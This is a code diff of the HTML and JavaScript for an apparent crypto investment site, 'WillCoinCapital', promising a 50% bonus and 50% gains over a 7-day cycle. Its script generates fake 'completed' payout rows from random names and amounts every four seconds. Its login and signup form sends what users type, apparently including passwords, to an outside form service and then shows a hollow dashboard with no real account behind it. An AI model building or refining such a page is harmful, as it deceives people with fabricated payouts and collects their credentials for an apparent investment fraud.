@@ -13,17 +13,22 @@
         .modal-bg { background: rgba(0, 0, 0, 0.95); backdrop-filter: blur(10px); }
         .custom-scroll::-webkit-scrollbar { width: 4px; }
         .custom-scroll::-webkit-scrollbar-thumb { background: #22d3ee; border-radius: 10px; }
-        #dashboard.hidden, #main-terminal.hidden { display: none; }
+        
+        .view-hidden { display: none !important; }
+        
         input[type="range"] { -webkit-appearance: none; background: #1f2937; height: 4px; border-radius: 10px; width: 100%; }
         input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; height: 18px; width: 18px; border-radius: 50%; background: #22d3ee; cursor: pointer; box-shadow: 0 0 15px rgba(34,211,238,0.7); }
         .support-float { position: fixed; bottom: 32px; right: 32px; z-index: 1000; }
         
-        /* Smooth Animation for 5-row live stream */
+        /* Fixed Table Layout for Perfect Alignment */
+        table { table-layout: fixed; width: 100%; }
+        th, td { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
         @keyframes slideIn {
-            from { opacity: 0; transform: translateX(-10px); }
-            to { opacity: 1; transform: translateX(0); }
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-        .new-row { animation: slideIn 0.5s ease-out forwards; }
+        .new-row { animation: slideIn 0.4s ease-out forwards; }
     </style>
 </head>
 <body>
@@ -44,13 +49,7 @@
 
         <main class="max-w-7xl mx-auto px-6 py-12 text-center">
             <h1 class="text-4xl md:text-7xl font-extrabold mb-6 tracking-tighter uppercase leading-[1.05]">MAXIMIZE YOUR <br> CRYPTO POTENTIAL WITH <br> <span class="text-cyan-400">WILLCOINCAPITAL.</span></h1>
-            <p class="text-gray-400 text-sm md:text-lg mb-10 max-w-3xl mx-auto font-medium leading-relaxed">Professional terminal tools and the industry's most flexible 7-day liquidity maturation protocols. • <span class="text-white font-bold">BE YOUR OWN BOSS.</span></p>
-
-            <div class="flex justify-center gap-4 mb-20">
-                <button onclick="toggleAuth('signup')" class="px-10 py-4 bg-cyan-400 text-black font-black rounded-xl uppercase text-xs btn-glow">Get Started Now</button>
-                <button onclick="toggleHow(true)" class="px-10 py-4 border border-white/20 text-white font-bold rounded-xl uppercase text-xs tracking-widest hover:bg-white/5">How We Work</button>
-            </div>
-
+            
             <div class="glass max-w-2xl mx-auto p-10 rounded-[40px] border border-white/5 relative mb-20">
                 <div class="absolute top-0 right-0 bg-cyan-400 text-black text-[9px] font-bold px-4 py-1.5 rounded-bl-xl uppercase">Bonus Active: 50%</div>
                 <h2 class="text-cyan-400 italic font-black uppercase text-sm mb-10 text-left tracking-widest">Profit Projection</h2>
@@ -74,8 +73,12 @@
                 </div>
                 <div class="glass rounded-3xl overflow-hidden border border-white/5">
                     <table class="w-full text-left text-xs">
-                        <thead class="bg-white/5 text-gray-500 uppercase font-bold">
-                            <tr><th class="px-8 py-5">Beneficiary</th><th class="px-8 py-5">Amount (Incl. Bonus)</th><th class="px-8 py-5 text-right">Status</th></tr>
+                        <thead class="bg-white/5 text-gray-400 uppercase font-bold">
+                            <tr>
+                                <th class="px-8 py-5 w-[35%]">User</th>
+                                <th class="px-8 py-5 w-[35%]">Payout Amount</th>
+                                <th class="px-8 py-5 w-[30%] text-right">Status</th>
+                            </tr>
                         </thead>
                         <tbody id="ledgerBody" class="divide-y divide-white/5">
                             </tbody>
@@ -85,11 +88,11 @@
         </main>
     </div>
 
-    <div id="dashboard" class="hidden min-h-screen bg-[#010409] p-6">
+    <div id="dashboard" class="view-hidden min-h-screen bg-[#010409] p-6">
         <div class="max-w-6xl mx-auto">
             <nav class="flex justify-between items-center mb-12">
                 <div class="flex items-center gap-2"><span class="w-3 h-3 bg-cyan-400 rounded-full animate-ping"></span><h2 class="text-cyan-400 font-black uppercase tracking-tighter italic text-xl">User Dashboard</h2></div>
-                <button onclick="location.reload()" class="text-[10px] text-gray-500 uppercase font-bold hover:text-white transition">Sign Out</button>
+                <button onclick="signOut()" class="text-[10px] text-gray-500 uppercase font-bold hover:text-white transition">Sign Out</button>
             </nav>
             <div class="grid md:grid-cols-3 gap-6 mb-10">
                 <div class="glass p-8 rounded-3xl"><p class="text-[10px] text-gray-500 uppercase font-bold mb-2">Total Portfolio</p><p class="text-3xl font-bold text-white">$0.00</p></div>
@@ -104,24 +107,7 @@
         </div>
     </div>
 
-    <div id="howModal" class="fixed inset-0 z-[1200] flex items-center justify-center p-6 hidden">
-        <div class="absolute inset-0 modal-bg" onclick="toggleHow(false)"></div>
-        <div class="glass max-w-2xl w-full max-h-[80vh] overflow-hidden flex flex-col rounded-[40px] border border-cyan-400/20 relative z-10">
-            <div class="p-8 border-b border-white/5"><h2 class="text-2xl font-black uppercase text-cyan-400">Investment Protocol</h2></div>
-            <div class="p-8 overflow-y-auto custom-scroll text-left text-xs text-gray-400 space-y-6">
-                <p>At willCoin Capital, we provide investors with a simple and transparent way to grow their digital assets.</p>
-                <div><h4 class="text-cyan-400 font-bold uppercase mb-1">1. Create Your Account</h4><p>Register a secure account on our platform in just a few steps.</p></div>
-                <div><h4 class="text-cyan-400 font-bold uppercase mb-1">2. Fund Your Investment</h4><p>Make a deposit into your investment wallet quickly and safely.</p></div>
-                <div><h4 class="text-cyan-400 font-bold uppercase mb-1">3. Receive a 50% Investment Bonus</h4><p>Every deposit automatically qualifies for a 50% bonus.</p></div>
-                <div><h4 class="text-cyan-400 font-bold uppercase mb-1">4. 7-Day Investment Cycle</h4><p>Each investment runs on a 7-day maturation cycle.</p></div>
-                <div><h4 class="text-cyan-400 font-bold uppercase mb-1">5. Withdraw Your Capital + Profits</h4><p>At the end of the cycle, withdraw original capital plus 50% gains.</p></div>
-                <div><h4 class="text-cyan-400 font-bold uppercase mb-1">6. Reinvest or Withdraw</h4><p>Choose to withdraw earnings or reinvest to continue growing.</p></div>
-            </div>
-            <div class="p-8 border-t border-white/5"><button onclick="toggleHow(false)" class="w-full py-4 bg-cyan-400 text-black font-black rounded-xl uppercase text-xs">Close Protocol</button></div>
-        </div>
-    </div>
-
-    <div id="authModal" class="fixed inset-0 z-[1100] flex items-center justify-center p-6 hidden">
+    <div id="authModal" class="fixed inset-0 z-[1100] flex items-center justify-center p-6 view-hidden">
         <div class="absolute inset-0 modal-bg" onclick="toggleAuth()"></div>
         <div class="glass max-w-md w-full p-10 rounded-[40px] border border-cyan-400/30 relative z-10 text-center">
             <h2 id="authTitle" class="text-2xl font-black uppercase text-cyan-400 mb-8">Login</h2>
@@ -135,12 +121,31 @@
     </div>
 
     <script>
-        function toggleHow(show) { document.getElementById('howModal').classList.toggle('hidden', !show); }
+        // PERSISTENT LOGIN LOGIC
+        window.onload = () => {
+            if (localStorage.getItem('isLoggedIn') === 'true') {
+                showDashboard();
+            }
+        };
+
+        function showDashboard() {
+            document.getElementById('main-terminal').classList.add('view-hidden');
+            document.getElementById('dashboard').classList.remove('view-hidden');
+            document.getElementById('authModal').classList.add('view-hidden');
+            localStorage.setItem('isLoggedIn', 'true');
+            window.scrollTo(0,0);
+        }
+
+        function signOut() {
+            localStorage.removeItem('isLoggedIn');
+            location.reload();
+        }
+
         function toggleAuth(mode) {
             const modal = document.getElementById('authModal');
-            if (!mode) { modal.classList.add('hidden'); return; }
+            if (!mode) { modal.classList.add('view-hidden'); return; }
             document.getElementById('authTitle').innerText = mode === 'login' ? 'Login' : 'Create Account';
-            modal.classList.remove('hidden');
+            modal.classList.remove('view-hidden');
         }
 
         document.getElementById('authForm').onsubmit = async (e) => {
@@ -149,16 +154,10 @@
             btn.innerText = "Connecting...";
             await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
             btn.innerText = "Success!";
-            setTimeout(() => {
-                alert("Account created successfully!");
-                document.getElementById('authModal').classList.add('hidden');
-                document.getElementById('main-terminal').classList.add('hidden');
-                document.getElementById('dashboard').classList.remove('hidden');
-                window.scrollTo(0,0);
-            }, 600);
+            setTimeout(showDashboard, 800);
         };
 
-        // --- UPDATED: 5-ROW LIVE LEDGER ENGINE ---
+        // LEDGER LOGIC
         const usernames = ["Alpha_User", "0x4e...f2", "CryptoKing", "User_772", "Btc_Hunter", "0x9d...1a", "Whale_99", "Trader_X", "Elite_Node", "0x7c...b1"];
         const ledgerBody = document.getElementById('ledgerBody');
 
@@ -172,23 +171,14 @@
                 <td class="px-8 py-5 font-bold text-white">$${amount}</td>
                 <td class="px-8 py-5 text-right"><span class="bg-green-500/10 text-green-400 px-4 py-1 rounded-full text-[9px] font-black uppercase tracking-widest">Completed</span></td>
             `;
-            
-            // Insert at the top
             ledgerBody.prepend(row);
-            
-            // Strictly maintain only 5 rows
-            while (ledgerBody.children.length > 5) { 
-                ledgerBody.lastElementChild.remove(); 
-            }
+            while (ledgerBody.children.length > 5) { ledgerBody.lastElementChild.remove(); }
         }
 
-        // Initialize with exactly 5 rows
         for(let i=0; i<5; i++) { addNewWithdrawal(); }
-        
-        // Refresh a row every 4 seconds for a "live stream" feel
         setInterval(addNewWithdrawal, 4000);
 
-        // Profit Projection Calculator
+        // Slider logic
         const input = document.getElementById('depositInput');
         const slider = document.getElementById('depositSlider');
         function updateCalc(val) {
